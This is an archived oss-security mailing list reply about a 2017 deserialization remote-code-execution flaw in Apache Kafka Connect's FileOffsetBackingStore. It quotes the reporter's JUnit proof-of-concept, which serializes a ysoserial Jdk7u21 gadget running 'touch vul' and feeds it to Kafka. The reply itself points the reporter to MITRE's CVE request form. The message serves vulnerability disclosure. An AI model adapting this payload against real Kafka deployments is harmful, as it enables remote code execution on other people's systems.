X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2726" "Wednesday" "19" "July" "2017" "11:15:13" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20170719091513.7qubl5vw3a34jbvi@lorien.valinor.li>" "74" "Re: [oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime" nil nil nil "7" "2017071909:15:13" "[oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime" (number mark "U       carnil@debia Jul 19   74/2726  " thread-indent "\"Re: [oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime\"\n") "<CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>" ("<CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21728 invoked by uid 550); 19 Jul 2017 09:15:28 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 21710 invoked from network); 19 Jul 2017 09:15:27 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=sender:date:from:to:subject:message-id:references:mime-version
         :content-disposition:in-reply-to:user-agent;
        bh=V1AWMaaaTrAoGCiD6O20gezNo9itQAsIIY6j7P+cqyo=;
        b=UXCx9jduGAttvwkaaSpB7y9xSLyPJyCQwJp1ki4VJ+4EeJpUZIr36wumrfmYHtRume
         gYl8n7IFo9Wap0Yd/GacfiIQyDgeU8HLFlNifNZ5szU40Q1WMWIIw3sUKv+cZb2tgSEL
         SStDRleKvY3eLcsTIr1CBMVwx+JBzW4RVyjQDl6ckRorcfxAkLGpcSKBstkfRfuBswfb
         lCzIQmOLYMUcsn441F2XRTc6/BpwFNebnOvLkujK/pDOHTdEUNaXeQ6aQ2/VpKwkqGWd
         IOwtehJdx/DaPOm0PMhdTnLzmLVsZNJHU38NsfqYO3UqrvrL8EuWRPYf042V6hkS2c+H
         CF/w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:sender:date:from:to:subject:message-id
         :references:mime-version:content-disposition:in-reply-to:user-agent;
        bh=V1AWMaaaTrAoGCiD6O20gezNo9itQAsIIY6j7P+cqyo=;
        b=p0FP3z5c0nANjxesNdg1usVOruQn6PuaqEcekgTLvPKKjTmlVNxJtCh2PrJK6rmcvB
         r0Ehh5SHqBFQ/lqFAoR6rZnLJ/CUgkGfcibYim4OXkjytzZpu/MVaXfxvpHUF9xBprlF
         mCjcVRHSEN6zUqETsqfaTkCTKczJJS/4cQwSp26u96WXo2zA1jRUtIKeppV/TxHfDY9+
         Mi9m0Cy3zNTmTZZPjlpeTll06atxc0hLWdotKZDBsCdrlOvvQSxhxx/6/7L1inFeyyNa
         1NO6jS908ANJy3QQjcw5nSudC01J6uf9nqaiiVKlm/NkLKLOGy08wVZ2R6ZL4dx/lIzV
         L0Iw==
X-Gm-Message-State: AIVw113r1+uyx3FyV8fa+rLrQFfzpvxFEiHUygxD12K9yBbHEGAijyma
	SUnBDX9W6GQQug==
X-Received: by 10.107.22.7 with SMTP id 7mr1417326iow.65.1500455715793;
        Wed, 19 Jul 2017 02:15:15 -0700 (PDT)
Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
Date: Wed, 19 Jul 2017 11:15:13 +0200
From: Salvatore Bonaccorso <carnil@debian.org>
To: oss-security@lists.openwall.com
Message-ID: <20170719091513.7qubl5vw3a34jbvi@lorien.valinor.li>
References: <CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>
User-Agent: NeoMutt/20170113 (1.7.2)
Subject: Re: [oss-security] CVE-IDs request for Apache Kafka desrialization
 vulnerability via runtime

On Wed, Jul 19, 2017 at 09:41:16AM +1000, Hooman Ghasem Broujerdi wrote:
> Hi,
> 
> Apache kafka connect-api runtime contains a desrialization vul via
> FileOffsetBackingStore
> which leads to remote code execution, this can be exploited reliably in
> JDK1.7.0_05, below is
> a unit test for it:
> 
> 
> import junit.framework.Test;
> import junit.framework.TestCase;
> import junit.framework.TestSuite;
> import org.apache.commons.io.FileUtils;
> import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
> import org.apache.kafka.connect.storage.FileOffsetBackingStore;
> import ysoserial.payloads.Jdk7u21;
> 
> import java.io.ByteArrayOutputStream;
> import java.io.File;
> import java.io.IOException;
> import java.io.ObjectOutputStream;
> import java.util.HashMap;
> import java.util.Map;
> 
> public void test_Kafka_Deser() throws Exception {
> 
>         StandaloneConfig config;
> 
>         String projectDir = System.getProperty("user.dir");
> 
>         Jdk7u21 jdk7u21 = new Jdk7u21();
>         Object o = jdk7u21.getObject("touch vul");
> 
>         byte[] ser = serialize(o);
> 
>         File tempFile = new File(projectDir + "/payload.ser");
>         FileUtils.writeByteArrayToFile(tempFile, ser);
> 
>         Map<String, String> props = new HashMap<String, String>();
>         props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG,
> tempFile.getAbsolutePath());
>         props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG,
> "org.apache.kafka.connect.json.JsonConverter");
>         props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG,
> "org.apache.kafka.connect.json.JsonConverter");
>         props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG,
> "org.apache.kafka.connect.json.JsonConverter");
>         props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG,
> "org.apache.kafka.connect.json.JsonConverter");
>         config = new StandaloneConfig(props);
> 
>         FileOffsetBackingStore restore = new FileOffsetBackingStore();
>         restore.configure(config);
>         restore.start();
>     }
> 
>     private byte[] serialize(Object object) throws IOException {
>         ByteArrayOutputStream bout = new ByteArrayOutputStream();
>         ObjectOutputStream out = new ObjectOutputStream(bout);
>         out.writeObject(object);
>         out.flush();
>         return bout.toByteArray();
>     }

Thanks for reaching out the oss-security list. Unfortunately direct
CVE assignments cannot be request anymore through the list, rather
please fill the form at https://cveform.mitre.org/

Once you have the CVE assigned, can you please followup with the
assignement in this thread, so that other are informed about it?

Regards,
Salvatore
